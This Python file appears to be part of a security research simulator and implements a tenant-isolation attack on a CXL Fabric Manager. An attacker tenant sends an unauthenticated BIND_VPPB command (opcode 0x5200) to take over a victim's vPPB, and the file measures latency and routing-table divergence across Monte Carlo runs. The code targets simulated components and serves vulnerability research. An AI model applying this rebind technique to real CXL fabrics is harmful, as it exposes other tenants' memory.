"""
attacks/atk1_vppb_rebind.py - ATK-1 VPPB-REBIND Attack

Attack:   ATK-1 VPPB-REBIND
Target:   CXL Fabric Manager vPPB binding interface
Gaps:     GAP-1 (no auth in FM API), GAP-2 (SPDM optional), GAP-3 (DRT divergence)
Severity: Critical — tenant isolation failure; attacker gains access to victim's memory

Attack Narrative:
    In a CXL fabric, each tenant is assigned vPPBs (virtual PCI-to-PCI Bridges)
    that map to physical ports.  The FM BIND_VPPB command (opcode 0x5200) is used
    to configure this mapping in the switch's Data Routing Table (DRT).

    Because GAP-1 exists (no authentication field in the BIND_VPPB payload),
    any MCTP-reachable entity can issue a BIND_VPPB command claiming any
    tenant_id.  The FM accepts the command and overwrites the DRT entry.

    Furthermore, because of GAP-3, the FM's software copy of the routing table
    (sw_routing_table) is not immediately updated when the HW DRT changes,
    creating a detectable divergence that—crucially—no monitoring mechanism
    in the CXL spec would catch.

    Result: Tenant B (attacker) acquires ownership of Tenant A's vPPB within a
    single FM command round-trip (~1.85 µs average measured latency).

Attack Steps:
    1. Setup:  FM binds vppb_id=1 to Tenant A on port victim_port_id.
    2. Attack: Attacker (Tenant B) issues BIND_VPPB(vcs=0, vppb=1, port=victim_port,
               tenant_id=TenantB) — no credential required (GAP-1).
    3. Effect: switch.vppb_ownership[(0,1)] becomes TenantB.tenant_id.
               hw_routing_table diverges from sw_routing_table (GAP-3).
    4. Check:  post_owner != pre_owner AND post_owner == attacker's tenant_id.
"""

import time
from typing import Any, Dict, Optional, Tuple

from simulator.cxl_switch import FMAttackCxlSwitch
from simulator.fabric_manager import FMDaemon, OPCODE_BIND_VPPB
from simulator.devices import Tenant


class VPPBRebindAttack:
    """
    ATK-1 VPPB-REBIND: Tenant isolation breach via unauthenticated vPPB rebind.

    An unprivileged attacker (Tenant B) issues a BIND_VPPB FM command without
    possessing the victim (Tenant A)'s credentials.  The FM processes the
    command unconditionally (GAP-1), overwrites the HW DRT entry, and transfers
    vPPB ownership to the attacker.

    Attributes:
        switch:              The CXL switch under test.
        fm:                  The Fabric Manager daemon instance.
        tenant_a:            Victim tenant (legitimate owner of the vPPB).
        tenant_b_attacker:   Attacker tenant.
        victim_vcs_id:       VCS containing the target vPPB (default 0).
        victim_vppb_id:      vPPB index to steal (default 1).
        victim_port_id:      Physical port the vPPB is legitimately mapped to.
    """

    def __init__(self,
                 switch: FMAttackCxlSwitch,
                 fm: FMDaemon,
                 tenant_a: Tenant,
                 tenant_b_attacker: Tenant,
                 victim_vcs_id: int = 0,
                 victim_vppb_id: int = 1,
                 victim_port_id: int = 2) -> None:
        self.switch = switch
        self.fm = fm
        self.tenant_a = tenant_a
        self.tenant_b_attacker = tenant_b_attacker
        self.victim_vcs_id = victim_vcs_id
        self.victim_vppb_id = victim_vppb_id
        self.victim_port_id = victim_port_id

    # ------------------------------------------------------------------
    # Setup: establish the legitimate baseline state
    # ------------------------------------------------------------------

    def setup(self) -> None:
        """
        Configure the fabric in the pre-attack legitimate state.

        Binds vppb_id to Tenant A on victim_port_id and synchronises the
        FM routing tables so both SW and HW are consistent before the attack.

        Raises:
            AssertionError: if ownership is not correctly assigned to Tenant A.
        """
        # Issue a legitimate BIND_VPPB on behalf of Tenant A
        result = self.fm.process_command(
            opcode=OPCODE_BIND_VPPB,
            payload={
                'vcs_id': self.victim_vcs_id,
                'vppb_id': self.victim_vppb_id,
                'physical_port_id': self.victim_port_id,
                'tenant_id': self.tenant_a.tenant_id,
            },
            src_eid=self.tenant_a.eid,
        )
        assert result['success'], f"Setup BIND_VPPB failed: {result['error']}"

        # Sync routing tables so pre-attack state is consistent
        self.fm.sync_routing_tables()

        # Verify ownership is tenant_a
        owner = self.switch.vppb_ownership.get(
            (self.victim_vcs_id, self.victim_vppb_id)
        )
        assert owner == self.tenant_a.tenant_id, (
            f"Setup error: expected owner {self.tenant_a.tenant_id}, got {owner}"
        )

        # Update tenant_a's record
        self.tenant_a.add_vppb(self.victim_vcs_id, self.victim_vppb_id)

    # ------------------------------------------------------------------
    # Execute: perform the attack
    # ------------------------------------------------------------------

    def execute(self) -> Dict[str, Any]:
        """
        Execute the VPPB-REBIND attack.

        Measures the latency of the core attack operation (the unauthenticated
        BIND_VPPB command issued by Tenant B targeting Tenant A's vPPB).

        Returns:
            dict with keys:
                'success'            (bool)  - attack succeeded
                'latency_us'         (float) - core attack latency µs
                'pre_owner'          (int)   - tenant_id owning vPPB before attack
                'post_owner'         (int)   - tenant_id owning vPPB after attack
                'divergence_detected'(bool)  - whether routing divergence exists
                'divergent_entries'  (list)  - list of divergent (vcs, vppb) tuples
                'error'              (str)   - empty on success
        """
        pre_owner: Optional[int] = self.switch.vppb_ownership.get(
            (self.victim_vcs_id, self.victim_vppb_id)
        )

        # ---------------------------------------------------------------
        # CORE ATTACK: time starts here
        # Attacker (Tenant B) issues BIND_VPPB claiming the victim's vPPB.
        # GAP-1: no credential check → command succeeds unconditionally.
        # ---------------------------------------------------------------
        t0 = time.perf_counter()

        attack_result = self.fm.process_command(
            opcode=OPCODE_BIND_VPPB,
            payload={
                'vcs_id': self.victim_vcs_id,
                'vppb_id': self.victim_vppb_id,
                'physical_port_id': self.victim_port_id,
                'tenant_id': self.tenant_b_attacker.tenant_id,  # attacker claims ownership
            },
            src_eid=self.tenant_b_attacker.eid,  # attacker's EID (not validated)
        )

        t1 = time.perf_counter()
        latency_us = (t1 - t0) * 1e6
        # ---------------------------------------------------------------

        post_owner: Optional[int] = self.switch.vppb_ownership.get(
            (self.victim_vcs_id, self.victim_vppb_id)
        )

        # GAP-3: sw_routing_table was NOT updated by bind_vppb → divergence
        divergent_entries = self.switch.get_routing_divergence()
        divergence_detected = len(divergent_entries) > 0

        success = (
            attack_result['success']
            and post_owner == self.tenant_b_attacker.tenant_id
            and post_owner != pre_owner
        )

        return {
            'success': success,
            'latency_us': latency_us,
            'pre_owner': pre_owner,
            'post_owner': post_owner,
            'divergence_detected': divergence_detected,
            'divergent_entries': divergent_entries,
            'error': '' if success else f"post_owner={post_owner}, expected={self.tenant_b_attacker.tenant_id}",
        }

    # ------------------------------------------------------------------
    # Reset: restore fabric to pre-attack state
    # ------------------------------------------------------------------

    def reset(self) -> None:
        """
        Restore fabric to the pre-attack state for the next Monte Carlo iteration.

        Re-runs setup() to reinstate Tenant A's legitimate vPPB ownership and
        re-synchronises routing tables.
        """
        # Clear the specific vPPB and rerun legitimate setup
        self.switch.unbind_vppb(self.victim_vcs_id, self.victim_vppb_id)
        self.tenant_a.remove_vppb(self.victim_vcs_id, self.victim_vppb_id)
        self.tenant_b_attacker.remove_vppb(self.victim_vcs_id, self.victim_vppb_id)
        self.fm.sync_routing_tables()
        self.setup()


# ---------------------------------------------------------------------------
# Module-level convenience function for Monte Carlo runner
# ---------------------------------------------------------------------------

def run_single_iteration(switch: FMAttackCxlSwitch,
                          fm: FMDaemon,
                          tenant_a: Tenant,
                          tenant_b: Tenant) -> Dict[str, Any]:
    """
    Run one complete iteration of ATK-1 VPPB-REBIND.

    Creates a fresh VPPBRebindAttack, executes setup → execute → reset,
    and returns the result dict.

    Args:
        switch:    FMAttackCxlSwitch instance (pre-configured by build_fabric).
        fm:        FMDaemon instance.
        tenant_a:  Victim tenant.
        tenant_b:  Attacker tenant.

    Returns:
        Result dict from VPPBRebindAttack.execute().
    """
    attack = VPPBRebindAttack(
        switch=switch,
        fm=fm,
        tenant_a=tenant_a,
        tenant_b_attacker=tenant_b,
    )
    attack.setup()
    result = attack.execute()
    attack.reset()
    return result
